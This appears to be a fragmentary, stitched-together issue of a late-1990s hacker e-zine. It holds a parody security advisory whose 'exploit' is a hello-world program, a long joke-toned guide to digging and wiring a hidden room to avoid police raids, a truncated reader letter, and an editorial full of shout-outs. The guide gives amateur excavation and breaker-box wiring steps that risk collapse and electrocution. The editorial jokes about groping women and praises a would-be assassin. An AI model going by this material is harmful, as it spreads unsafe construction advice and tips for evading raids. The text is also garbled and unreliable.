        A layout of the hard disk is given:

                * Root filesystem /
                *     Usr filesystem /usr
                *     Home filesystem /home
                *     Root's filesystem /root
                *     Tmp's filesystem /tmp
                *     Var's filesystem /var

------------------------------------------------------------------
main()
{
printf("hello, world\n");
/*
 * here, we print to the screen
 * this is considered a vulnerablilty because we were able to show
 * just how much damange can really be done with this unique
 * and as-of-yet-unknown method
 */
}

Section 4 [The exploit]:

// PUBLIC RELEASE

       obecian

Section 6 [Come 1 Come ALL]:

       Team Leet invites you to join efnet #openbsd for a great learning
experience.  Just join us to teach and learn.  But remember, SEXUAL
HARASSMENT = FAT LAWSUIT.  www.dqc.org/~chris

Section 7 [Lies]:

       I hope this advisory makes you feel warm inside.  I know that Windows
NT will always rule my world.  I think Bill Gates is a role model for my
children and their grand-children.  I like eating pineapples.  All OpenBSD
users are paranoid schizophrenics who fall to my knees when they read this
message.

# Another mindless production brought to you by ehlf, and tak.

So, you want to impress friends, girls, and feds, eh? Well here is your
one  stop guide to living as a ninja. If you have ever been raided, or
feared  raiding, you can protect yourself by installing a hax0r room in 
your  setup. Ever watched Scooby Doo, and Shaggy always leans up against a
fireplace  or bookshelf, and falls into a hidden passage/room? Well that
is  the theory behind the hax0r room. First your hax0r room should be on
the  bottom floor of your house, or basement. If your house is completely  
above ground, it may be a little harder to do, but its possible. Scenario
#1:  You live in a 1 story house, with no basement...This is the hardest
one,  but you can still make it work. If you have a small room, you can
cover  the entrance, and make it your own little room. The problem with
this  is that sometimes you can tell that there is missing space in a
house,  which can get bad. Another solution to this would be to leave the  
existing entrance to the room, but make it a smaller room, or hallway, and  
keep a portion of the room to yourself. This same scenario works for most  
houses with no basement. 

Digging:
Another option can be to big out where you would like to work, if you are
in a  basement, the ideal way would be to knock out a portion of a wall in
a  room, and dig from there. Make sure that you dig in a place not too
much  weight will be forced upon, I’m not sure about how this all works,
but I  don’t think I would build this under my garage, 2 inches under the  
cement. I would give a little bit of room from the surface, and not
somewhere  where allot of weight will be pressed down upon. It may take
some  work, but it is definitely worth it. When you finish digging, you
will  probably want to smooth the ceiling, walls, and floor. After you
get  most of the dirt even, you should probably get a couple of friends
to  help you, and fix up the place. If you desire, this could help out a
bit  with ?smell? or ?water? in your pad...Get some of that plastic looking  
stuff that they   put on dirt, and put rocks over in yards, the black
stuff.  Put on your walls and ceiling, and spike in with some taint spikes
or  something. Now you should get some 4x4" posts, and put them in the 4  
corners of the room, touching the ceiling, and put them in-between at least  
every 8 feet. [be sure to finish reading this document before starting]
Now  take some 8x4' pieces of plywood, and put them on the floor, 8'long,
and  4' tall. Your 4x4" beams will be 8' or less away, so you can now nail  
them up. The beams will stick 4 inches out from the wall...duh, so when
you  board up the plywood you should have about 4 inches from the wood to
the  dirt. You should fill this with insulation, after you  wire the  
outlets[will discuss later]. Now you have 4 semi-cool walls, and  
electrical[read on]. You now should take care of the floor. Get a long
piece  of wood, that can go at least 2" deep, and equal the width of the
room  in length. Put the board up in the far end of the room, and it will  
isolate a section that you can poor concrete into, you can get this fairly  
cheap...quick dry cement or whatever. When that finishes, break the stick  
away, and move it a bit back, and work on the new section on cement,
etc.  Soon enough you will be close to finished. Now for the ceiling, you
will  need to be semi-ninja. Remember those 4x4 posts? Well you are going
to  have to get some people, and hoist a 4x8 up flat against the
ceiling. After  you got it up there, slid the first one into a corner, so
that  the corner 4x4 in the room has a corner of the plywood, and a mid-4x4
has  another end of the wood. On the loose end, pry some wood under it to
hold  it up, while you figure it out. What seems to work would be a long
spike  with a notch on the end to catch in the dirt, and the other end to  
screw into the wood. Ie:  
   /|___________________________________/ / <-- catch in dirt [bend?]
    | ___________________________________/ <-- shove up into dirt
    |_|<-- part to screw to wood
Shove that hoe up into the dirt, then screw into the wood. This provides
you  with a little security, but you need a bit more. Now do that to most
of  the end of the room, however many you need. On the border of the wood,  
where they touch when finished, you should nail/bolt/screw them together
with  another small piece of wood. Now you may have a bare spot in the
center  which is open, and hard to work, take the measurements, and cut the  
wood to size. Now you want to get Two 2x4's however long you think is
enough,  and cut them as so:


 The top part should be at a smooth angle, as to be not-so hard to

|\    knock into the ceiling.
| \
 \ \ The bottom should be cut so when the woos is put into the ceiling at
  \ \  an angle, it
   \ \   will be plush with the ceiling. 
    \_\
You want Two of these, and drive them in opposite directions into the
empty  space, like an X till they are all the way in. Now you will host
the  plywood up, while screwing it to these pieces of wood, then take the  
edges and fasten them to the other sheeps of plywood. Your ceiling is now  
finished, you may want to   put a couple 2x4's stretched across the room
from  4x4 to 4x4 to secure the plywood even more. Remember this isn’t all
for  fashion...yet, and who is going to be looking at your ceiling? Now if
you  want to use some spray paint or whatever on the walls, could even put
up  sheetrock[drywall] and paint it pro-like. You now have an '0d4y h4x0r 
p4d'

Electrical:
When installing the 4x8's on the walls of your hax0r pad, you may want to
take  into consideration...power...The average cord length is 6 feet, so
its  a rule that every outlet should be no more than 12 feet apart[6 in
either  direction] You beat that, you have 4x4 posts every 8 feet, which
you  should mount some electrical box's in. These box's are usually beige,  
or blue, and 3 inches tall, by a  couple inches wide, and 2 deep. nail
these  things to the 4x4's open side where the plywood will go, sticking
out  about the thickness of the plywood. You will want to get some
electrical  wire, it is about 1/2-3/4 an inch wide, 1/4inch tall, and
comes  in rolls, it is white. There wires in it are separated by paper,
and  come with 3 wires, Ground, White, and Black, or Red. This wire is
cheap,  so I’m not going to go into detail on how to splice it, so you
should  run each one separately. Running each one to its own breaker is an  
advantage, cause it will be a bit more secure with the limitations of  
electricity on each line, especially if you are running many computers,
and  electrical shit. Your computers wont power off, but it will take more  
cable, and more breakers...they are cheap. Go to the hardware store, and
buy  some electrical outlets, connect the wires appropriately to the back
of  them, and screw them into the outlet box's on the 4x4's. Those wires
from  there should run back to your breaker box, where you will screw
them  into a breaker...this isn’t the most professional way, but its the
safest  way, going for easy. Take the end of the wire, and appropriately  
fastener it to the breaker, that is not yet in the box. Then power down the  
whole box, and install the breaker. Do this for each outlet, then turn
on.  You now have electricity. NOTE: Be sure to not leave wire exposed,
and  be as safe as you can. Also these methods are far from the BEST, but  
they do work. If you know of a better way, or of a qualified electrical,  
please have them help. Each circuit for every  outlet isn’t too proficient,  
but it gets the job done, as long as you have a little bit of a cash  
flow...not even allot. EOF

Decor:
Now that you have allot of the necessities taken care of, its time for the  
ninja-part. You should paint the walls, and ceiling..Be sure to leave air  
flow for the fumes. Then move in any carpet you may want. After the
carpet,  move in any couches/desks/tv's/refrigerators/computers you need,  
and set them all up. Table lamps are a good idea, but if you wish to mount
a  light, it's the same principal as the outlets. Now is the time to fix
up  the door. To make this an uberhax0r pad, you need to hide the
entrance.  You should patch the outside, except for a small, yet
reasonable  doorway. In front of this doorway, you could put a bookshelf,  
couch, or anything to hide it. Be sure to put handles, or something to be
able  to close the entrance after you get in, and also make some sort of
way  to see out before you just open it up, and expose yourself to the
whole  world.

These methods are by far not the best, and efficient ways of doing things,
but  they get the job done, and are fairly simple for the average man. Try  
other stuff, its a 'project'.

Hi Ryan!
A year ago I have sent you an e-mail and you wrote me back.
You remember?If not, it doesn4t matter!I found it very interesting to

 that piece you wrote in the first issue of b0g, called "smoke"

 you wrote it very beautifully, showing feelings in a

 have you written any other stuff like that?

My deepest apologies to everyone that has been waiting so long for this issue.
Other then the fact that me, myself and the rest of the contributors are lazy 
gimps, I don’t have many valid excuses. We moved from www.pcisd.com to our very 
own server, thanks to solar, we all love you! Which caused some delay since we 
were forced to rebuild some of the site. 

Now, if you want to see the next issue released this year you besta get your act 
together and write us some articles! Remember, b0g lives because of you.

Much love goes out to everyone that contributed to this and past issues, 
everyone that is thinking of doing so, everyone that fears, you for reading 
this, everyone in #b0g on undernet, samn, stefano, gyrate, val, leah and the 
rest of the gimps at www.survivorer.com <-- go there and root for me!
I'm one of now 9 people that might win a million bucks!%@!
Everyone that visits our site, everyone that links our site!
Stile, solar, progen and the gimps at progenic.com, the gimps at alldas.de, 
shizniz and the gimps at hack-net.com, alan and the gimps at packetstorm, 
everyone who mirrors our superdastic zine, everyone who sends me emails, 
everyone who listens to my crazy ramblings on irc, everyone who doesn’t laugh at 
me when I pass them, chicks who doesnt turn around and hit me when I grope a 
feel of them at clubs or concerts, the guy who planed to assassinate N’sync, 
Rloxley, the feds who hang on irc, tak’s mom for giving birth to him, dade 
murphy and the guys at 2600 for bringing us the coolest movie ever!
